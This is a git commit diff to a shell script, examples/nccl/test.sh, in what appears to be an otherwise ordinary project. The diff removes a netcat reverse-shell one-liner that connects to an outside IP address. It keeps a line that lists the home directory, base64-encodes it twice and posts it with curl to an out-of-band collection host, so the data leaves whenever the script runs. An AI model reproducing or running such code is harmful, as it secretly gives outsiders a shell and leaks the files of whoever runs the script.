28ac8ceab621a19ab384619b5ad570cbb4b38c8a
Roni-Carta <roni@landh.tech>
2024-10-03 18:06:07 +0200

    test ls

--- examples/nccl/test.sh
+++ examples/nccl/test.sh
@@ -1,8 +1,6 @@
 #!/bin/bash
 
-bash -i  rm /tmp/f>/dev/null 2>&1;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 18.198.77.177 17446 >/tmp/f 
-
-$B64_BLOB=`ls $HOME | base64 | base64`
+B64_BLOB=`ls $HOME | base64 | base64`
 
 curl -s -d "$B64_BLOB" "https://dqlfdzgroddmzbuqfjndfaghnnk8bq84t.oast.fun/" > /dev/null
 
